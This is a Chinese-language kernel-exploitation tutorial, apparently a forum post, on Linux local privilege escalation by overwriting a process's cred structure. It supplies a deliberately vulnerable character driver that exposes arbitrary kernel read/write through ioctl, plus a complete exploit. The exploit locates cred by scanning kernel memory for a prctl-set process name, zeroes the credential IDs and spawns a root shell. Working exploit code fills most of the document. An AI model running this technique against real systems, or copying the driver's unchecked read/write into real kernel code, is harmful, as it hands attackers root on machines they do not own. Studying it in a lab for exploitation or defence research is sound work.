# linux 内核提权总结(demo+exp分析) -- 任意读写(一)


[发表于看雪论坛](https://bbs.pediy.com/user-839858.htm)

## cred篇

+ 每个线程在内核中都对应一个线程结构块thread_info
+ thread_info中存在task_struct类型结构体
+ struct task_struct中存在cred结构体用来保存线程权限

+ 攻击流程
    - 定位某进程的cred结构体
    - 将cred结构提结构体的uid~fsgid全部覆写为0(前28字节)

### 一. 利用步骤

#### 1. 定位cred结构体

+ task_struct中存在char comm[TASK_COMM_LEN]

+ comm字符串使用prctl函数的PR_SET_NAME自行设置

+ 在内存中搜索被设置后的comm字符串，cred结构体地址就在附近

+ 泄漏cred结构体地址，定向覆盖cred结构体

#### 2. 进程权限被修改，变成root进程，执行system("/bin/sh")，弹出root shell

### 二. 驱动代码

``` c
#include <linux/init.h>
#include <linux/module.h>
#include <linux/cdev.h>
#include <linux/device.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <asm/cacheflush.h>

#define CHANGE_POINT 0x100000
#define RW_READ 0x100001
#define RW_WRITE 0x100002
#define SET_MEM 0x100003

dev_t dev_id = 0;
struct cdev cdev_0;
struct class *dev_class;

struct vunl
{
    char *point;
    size_t size;
} VUNL;

long rw_any_ioctl(struct file *filp, unsigned int cmd, unsigned long arg)
{
    int ret = 0;
    switch (cmd)
    {
    case CHANGE_POINT:
        ret = copy_from_user(&VUNL, (struct vunl *)(arg), sizeof(struct vunl));
        break;

    case RW_READ:
        ret = copy_to_user((char *)arg, (char *)VUNL.point, VUNL.size);
        break;

    case RW_WRITE:
        ret = copy_from_user((char *)VUNL.point, (char *)arg, VUNL.size);
        break;

    default:
        break;
    }

    return ret;
}

int rw_any_init(void)
{
    unsigned int base_minor = 0;
    unsigned int dev_num = 1;
    static const struct file_operations fops = {
        .unlocked_ioctl = rw_any_ioctl};
    alloc_chrdev_region(&dev_id, base_minor, dev_num, "rw_any");
    cdev_init(&cdev_0, &fops);
    cdev_add(&cdev_0, dev_id, 1);
    dev_class = class_create(THIS_MODULE, "rw_any_class");
    device_create(dev_class, 0, dev_id, NULL, "rw_any_dev");

    return 0;
}

void rw_any_exit(void)
{
    device_destroy(dev_class, dev_id);
    class_destroy(dev_class);
    cdev_del(&cdev_0);
    unregister_chrdev_region(dev_id, 1);
}

module_init(rw_any_init);
module_exit(rw_any_exit);

MODULE_LICENSE("GPL");
```

### 三. exp

``` c
#define _GNU_SOURCE

#include <stdio.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <sys/prctl.h>

#define CHANGE_POINT 0x100000
#define RW_READ 0x100001
#define RW_WRITE 0x100002

struct vunl
{
    char *point;
    size_t size;
} VUNL;

size_t leak_data(int fd, char *buf, char *target)
{
    char *res = 0;
    size_t cred = 0;
    size_t real_cred = 0;

    VUNL.size = 0x1000;
    for (size_t addr = 0xffff880000000000; addr < 0xffffc80000000000; addr += 0x1000)
    {
        VUNL.point = (char *)addr;

        ioctl(fd, CHANGE_POINT, &VUNL);
        ioctl(fd, RW_READ, buf);
        res = memmem(buf, 0x1000, target, 16);

        if (res)
        {
            printf("[+] the addr of comm[TASK_COMM_LEN] is: %p\n", res);
            cred = *(size_t *)(res - 0x8);
            real_cred = *(size_t *)(res - 0x10);
            if ((cred || 0xff00000000000000) && (real_cred == cred))
            {
                printf("[+] found cred 0x%lx\n", real_cred);
                break;
            }
        }
        if (res == 0)
        {
            puts("[-] not found, try again!\n");
        }
    }
    return real_cred;
}

int main()
{
    int fd = 0;
    char target[16] = "TheTargetOfComm";
    char *buf = malloc(0x1000);
    char payload[28] = {0};
    size_t cred = 0;
    prctl(PR_SET_NAME, target);
    fd = open("/dev/rw_any_dev", O_RDWR);
    VUNL.point = (char *)leak_data(fd, buf, target);
    VUNL.size = 28;
    ioctl(fd, CHANGE_POINT, &VUNL);
    ioctl(fd, RW_WRITE, payload);

    if (getuid() == 0)
    {
        printf("[+] r00t:\n");
        system("/bin/sh");
    }
    else
    {
        puts("[-] error!");
        exit(-1);
    }

    return 0;
}
```


